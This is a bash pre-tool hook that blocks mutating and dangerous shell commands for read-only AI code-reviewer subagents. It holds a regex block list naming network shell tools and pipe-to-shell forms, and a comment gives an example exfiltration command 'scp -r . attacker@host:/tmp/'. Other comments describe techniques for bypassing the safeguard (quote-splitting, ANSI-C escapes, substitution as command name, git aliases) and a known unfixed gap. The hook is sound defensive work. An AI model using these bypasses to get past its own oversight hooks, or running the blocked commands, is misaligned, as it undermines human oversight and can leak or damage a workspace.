#!/bin/bash
# gemini-sidecar/hooks/validate-reviewer-bash.sh
# @ai-rules:
# 1. [Pattern]: Claude Code subagent-level PreToolUse hook (frontmatter `hooks:` field,
#    NOT the global settings.json hook registered by cli-setup.js). Wired per-subagent
#    in gemini-sidecar/agents/reviewers/*.md frontmatter, matcher "Bash".
# 2. [Constraint]: Read hook JSON from STDIN only (never argv -- avoids ARG_MAX/E2BIG).
#    Exit 2 (with stderr message) blocks the tool call; exit 0 allows it.
# 3. [Contract]: Defense-in-depth blocklist, NOT an exhaustive sandbox. This is layer 3 of 3:
#    (1) reviewer subagents' `tools:` allowlist (no Write/Edit/NotebookEdit), (2) native
#    Claude Code `permissions.deny` rules (--settings code-reviewer-permissions.json,
#    engine-enforced, shell-operator-aware), (3) this hook (custom regex, catches what the
#    denylist can't express, e.g. flag-insertion, indirection, heredoc-interpreter forms).
#    See gemini-sidecar/rules/code_reviewer.md Hard Rules for the documented residual-risk
#    trade-off (bypass risk + false-positive risk, both accepted) and the tracked sandboxing
#    follow-up (OS-level enforcement, gated on an OpenShift SCC/bubblewrap compatibility probe).
# 4. [Contract]: MUST fail CLOSED (exit 2), never fail OPEN (exit 0), on any extraction
#    failure -- missing node, parse error, or timeout. An empty command is only ever
#    "allow" when extraction explicitly succeeded and the command was genuinely empty.
# 5. [Gotcha]: Read-only commands (git diff/log/blame, rg, find, cat) must NOT match any
#    pattern below -- reviewer subagents need these for their actual job.

set -uo pipefail

INPUT=$(cat) || { echo "Blocked: failed to read hook input, failing closed" >&2; exit 2; }

if ! command -v node >/dev/null 2>&1; then
  echo "Blocked: node runtime unavailable, cannot validate command safely, failing closed" >&2
  exit 2
fi

# Input goes to node via STDIN (not argv) so a large command can never hit execve's
# ARG_MAX and silently truncate to empty (the fail-open bypass found in review).
PARSED=$(printf '%s' "$INPUT" | timeout 5 node -e "
  let raw = '';
  process.stdin.on('data', (chunk) => { raw += chunk; });
  process.stdin.on('end', () => {
    try {
      const data = JSON.parse(raw);
      process.stdout.write('OK:' + ((data.tool_input && data.tool_input.command) || ''));
    } catch (e) {
      process.stdout.write('ERR');
    }
  });
" 2>/dev/null)
NODE_STATUS=$?

# Any failure (missing node, non-zero exit, timeout kill, or an ERR sentinel from a
# JSON parse failure) fails CLOSED. Only an explicit "OK:" prefix is treated as a
# successfully-parsed command (which may legitimately be empty).
if [ "$NODE_STATUS" -ne 0 ] || [[ "$PARSED" != OK:* ]]; then
  echo "Blocked: could not parse hook input or validator timed out, failing closed" >&2
  exit 2
fi

COMMAND="${PARSED#OK:}"
[ -z "$COMMAND" ] && exit 0

# Join backslash-newline continuations the way bash itself does when it executes this
# string (deletes both characters, concatenating with no inserted space), then collapse
# any remaining bare newlines (genuine multi-statement commands) into spaces. Without
# this, grep evaluates $COMMAND per-line and `git \` + newline + `commit` slips through
# as two individually-safe-looking lines.
NORMALIZED=$(printf '%s' "$COMMAND" | sed -z 's/\\\n//g' | tr '\n' ' ')

# ANSI-C quoting ($'...') lets bash interpret \xNN/\oNNN escapes into arbitrary literal
# bytes at parse time -- the only standard construct that can produce a command name
# (e.g. "rm") without its literal text ever appearing anywhere in $COMMAND for the
# checks below to see. Legitimate reviewer commands (git/grep/find/rg/cat) never need
# this construct; block it outright rather than trying to decode every escape form.
if printf '%s\n' "$NORMALIZED" | grep -q "\$'"; then
  echo "Blocked: ANSI-C quoting (\$'...') is not permitted -- reviewer subagents are read-only." >&2
  exit 2
fi

# A command that STARTS a statement with a substitution ($(...) or a backtick
# expression) is computing its own command name dynamically -- this covers ANY
# mechanism that decodes to a command name at runtime (base64, printf hex-escapes,
# echo -e, etc.), since the check is on POSITION, not content. Legitimate read-only
# commands use substitution as an ARGUMENT (e.g. `git log $(cat ref.txt)`), never as
# the executable position. Checked at start-of-command AND after any command
# separator (;, &, |) -- not just the very start of the whole string -- so
# `true; $(echo r)m -rf /data` is caught too, not just a substitution in position 0.
# `["']*` tolerates the substitution being wrapped in quotes (`"$(...)"`), which
# would otherwise dodge a bare `^\$\(` anchor while still resolving to the same
# dynamically-computed command at execution time.
# Known residual gap (documented, not fixed): a substitution-as-command-name that
# lands immediately after a NEWLINE-turned-separator (rather than ;/&/|) is
# indistinguishable from ordinary whitespace once NORMALIZED collapses newlines to
# spaces above -- same class of accepted risk as the other exotic forms noted below.
if printf '%s\n' "$NORMALIZED" | grep -qE '(^|[;&|])[[:space:]]*["'"'"']*(\$\(|`)'; then
  echo "Blocked: command substitution as the command itself is not permitted." >&2
  exit 2
fi

# Strip quote characters before the main mutation check so quote-splitting (writing a
# dangerous token as e.g. r'm' -- bash concatenates adjacent quoted/unquoted strings
# into one "rm" token at parse time, but the literal bytes "r","'","m","'" never
# contain the contiguous substring "rm" for \b matching to see) can't hide a token.
UNQUOTED=$(printf '%s' "$NORMALIZED" | sed -E "s/[\"']//g")

# Strip the common /dev/null redirect idiom before the mutation check so legitimate
# read-only commands (`grep ... 2>/dev/null`, `git log ... 2>/dev/null`) aren't
# false-positived by the generic `>` pattern below.
CHECK_COMMAND=$(printf '%s' "$UNQUOTED" | sed -E 's#[0-9]?>>?[[:space:]]*/dev/null##g')

# Each alternative below corresponds to a category documented in code_reviewer.md:
# git mutations | filesystem mutations | remote pipe/heredoc execution |
# infra/package mutations | shell-wrapper mutation | interpreter-mediated mutation.
# \b (word boundary) is used instead of anchoring to start-of-string/separator so
# prefixed (`sudo rm`), substituted (`$(rm ...)`, `` `rm ...` ``), and indirected
# (`X=rm; $X`) forms are all caught -- absolute-path invocation still matches too,
# since `\b` fires at the path-separator boundary regardless of what precedes it.
# `((-\S+)(\s+\S+)?\s+)*` between a command and its dangerous subcommand tolerates
# flag insertion, including flags with a separate value argument (`git -C dir commit`,
# `kubectl --context=prod apply`, `sed -e 's/a/b/' -i`), without loosening enough to
# skip over a non-flag token (so `git log -- commit_msg.txt` correctly does NOT match:
# `log`/`--`/the filename never start with `-` immediately after `git`, so the
# alternation is never reached at all -- there is no partial-match path that lands on
# "commit" later). Used everywhere a flag might carry a separate value (FLAG_GAP was
# previously narrower for kubectl/oc/sed -i than for git -- inconsistent, now unified).
GIT_GAP='((-\S+)(\s+\S+)?\s+)*'
# `git config` covers the alias-definition bypass (`git config --local alias.p push`
# followed by `git p ...`): the runtime-resolved alias name is opaque to any static
# check, so the fix is blocking the ability to DEFINE a new alias in the first place.
# `branch`/`switch` apply GIT_GAP a SECOND time between the subcommand and ITS OWN
# mutating flag (`git branch --no-color -d x`), not just between `git` and the
# subcommand -- and include the GNU long-option spelling (`--delete`, `--create`)
# alongside the short form, since flag-gap tolerance alone doesn't help if the flag
# text itself isn't in the alternation.
BLOCK_PATTERN="\\bgit\\s+${GIT_GAP}(commit|push|merge|rebase|reset\\s+.*--hard|checkout\\s+-[bB]|branch\\s+${GIT_GAP}(-[dD]\\b|--delete\\b)|tag\\s|clean\\s+-\\S*f|rm\\b|apply\\b|am\\b|switch\\s+${GIT_GAP}(-c\\b|--create\\b)|config\\b)"
BLOCK_PATTERN+='|\b(rm|mv|chmod|chown|dd|cp|ln|install|mkdir|touch)\b'
BLOCK_PATTERN+='|\bfind\b.*(-delete\b|-exec\s+(rm|mv|chmod|chown|dd|cp)\b)'
# Redirect-mutation check excludes only `&` (fd duplication: `2>&1`, `>&2`) -- NOT
# digits generally. A prior version excluded `[^&0-9]`, meaning any redirect target
# starting with a digit (`>1x.sh`) evaded detection entirely; digit-prefixed fd-target
# redirects (`2>&1`) are still correctly excluded because `&` itself is the excluded
# char, immediately after `>`, regardless of what precedes `>`.
# sed in-place: covers the attached-suffix short form (`-ibak`, no space -- GNU sed
# accepts a suffix glued directly onto -i) and the GNU long option (`--in-place`,
# `--in-place=.bak`). A prior version only matched bare `-i` with mandatory trailing
# whitespace, which a suffix like `-ibak` defeated (nothing to anchor `\b` on between
# "-i" and "bak" -- they're one token). Requires a preceding space so this doesn't
# fire on a quoted search pattern that happens to contain the substring "-i".
BLOCK_PATTERN+='|\bsed\b.*[[:space:]]-i[a-zA-Z0-9._-]*\b|\bsed\b.*--in-place\b'
BLOCK_PATTERN+="|>\\s*[^&]|\\btee\\b"
BLOCK_PATTERN+='|(curl|wget).*\|\s*(sh|bash)'
# scp/ssh/rsync/sftp: no legitimate read-only-review need, and unlike curl/wget these
# require no special flag or pipe target to exfiltrate the workspace (plain
# `scp -r . attacker@host:/tmp/` needs no obfuscation at all) -- block outright.
BLOCK_PATTERN+='|\b(scp|ssh|rsync|sftp)\b'
BLOCK_PATTERN+="|\\b(kubectl|oc)\\s+${GIT_GAP}(apply|delete|patch|edit|scale)\\b|\\bnpm\\s+(publish|version)\\b"
BLOCK_PATTERN+='|\b(bash|sh|zsh)\s+(-\S+\s+)*-c\b|\|\s*(bash|sh|zsh)\b'
BLOCK_PATTERN+='|\bpython3?\s+(-\S+\s+)*-c\b|\bnode\s+(-\S+\s+)*(-e|--eval)\b|\bperl\s+(-\S+\s+)*-e\b|\bruby\s+(-\S+\s+)*-e\b|\|\s*(python3?|node|perl|ruby)\b'
BLOCK_PATTERN+='|\b(bash|sh|zsh|python3?|node|perl|ruby)\s*(<<|<[[:space:]])'
# Bare "<interpreter> <file>" (no -c/-e/heredoc/pipe) runs an arbitrary script FILE --
# a pre-existing malicious script committed to the reviewed repo needs no write at
# all, only invocation, so write-detection above doesn't cover this path. The next
# token after the interpreter name must start with `-` (a flag: --version, -m, etc.)
# to be allowed; anything else (a path, a bare filename) is blocked. This is stricter
# than "no legitimate use exists" -- it is "no legitimate use was found in this
# review's own verification commands" (helm/tsc/pytest are standalone binaries, not
# `python3 <file>` invocations), so the trade-off leans safe over permissive.
BLOCK_PATTERN+='|\b(bash|sh|zsh|python3?|node|perl|ruby)\s+[^-[:space:]]'

if printf '%s\n' "$CHECK_COMMAND" | grep -qiE "$BLOCK_PATTERN"; then
  # Bound + redact the logged command: blocked commands can legitimately contain
  # secrets (e.g. a curl -H "Authorization: Bearer ...") that must not reach pod logs.
  # Covers bearer/basic auth headers, generic key=value secrets, basic-auth-in-URL
  # (https://user:pass@host), and common vendor token prefixes (GitHub ghp_/gho_,
  # GitLab glpat-, AWS AKIA) -- not exhaustive, but closes the specific gaps found
  # in review (colon-delimited custom headers, PAT-prefixed tokens).
  LOG_COMMAND=$(printf '%s' "$COMMAND" \
    | sed -E 's#://[^/@[:space:]]+:[^/@[:space:]]+@#://<redacted>@#g' \
    | sed -E 's/(Bearer|Authorization:|[A-Za-z_-]*(token|password|apikey|api_key|secret)[[:space:]]*[:=])[[:space:]]*[^[:space:]]*/\1 <redacted>/gi' \
    | sed -E 's/\b(ghp_|gho_|ghu_|ghs_|glpat-|AKIA)[A-Za-z0-9_-]+/\1<redacted>/g' \
    | cut -c1-200)
  echo "Blocked: reviewer subagents are read-only. Command matched a mutation pattern: $LOG_COMMAND" >&2
  exit 2
fi

exit 0
